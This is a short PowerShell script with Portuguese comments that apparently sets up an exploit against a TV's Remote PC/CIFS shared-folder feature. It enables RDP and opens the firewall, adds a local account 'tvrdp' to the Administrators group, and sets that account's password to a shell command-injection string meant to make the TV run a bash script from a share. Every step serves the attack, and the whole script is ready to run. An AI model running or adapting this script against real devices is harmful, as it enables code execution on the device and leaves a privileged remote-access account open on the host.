# arm-rdp.ps1 — RODAR COMO ADMINISTRADOR
# Re-arma o ambiente CIFS-root usando a conta dedicada "tvrdp".
# Liga RDP, reativa tvrdp, define a senha dela = payload.
# rpf16 NAO e tocado. Reverter com cleanup-rdp.ps1.

$ErrorActionPreference = 'Continue'

Write-Host '== tvrdp =='
Enable-LocalUser -Name 'tvrdp' -ErrorAction SilentlyContinue
Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'tvrdp' -ErrorAction SilentlyContinue
Add-LocalGroupMember -Group 'Administradores' -Member 'tvrdp' -ErrorAction SilentlyContinue
Add-LocalGroupMember -Group 'Administrators'  -Member 'tvrdp' -ErrorAction SilentlyContinue

Write-Host '== RDP =='
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
Enable-NetFirewallRule -DisplayGroup 'Área de Trabalho Remota' -ErrorAction SilentlyContinue

Write-Host '== senha payload (tvrdp) =='
$sec = ConvertTo-SecureString '$(/bin/bash</home/owner/share/r)' -AsPlainText -Force
Set-LocalUser -Name 'tvrdp' -Password $sec
Write-Host 'senha de tvrdp = payload definida (rpf16 intocado)'

Write-Host '== Estado =='
Get-LocalUser -Name 'tvrdp' | Select-Object Name,Enabled
(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server').fDenyTSConnections
Test-NetConnection -ComputerName 127.0.0.1 -Port 3389 -WarningAction SilentlyContinue | Select-Object TcpTestSucceeded
Write-Host 'PRONTO. Na TV: Remote PC > editar perfil > usuario tvrdp, senha = o payload > Shared Folder.'
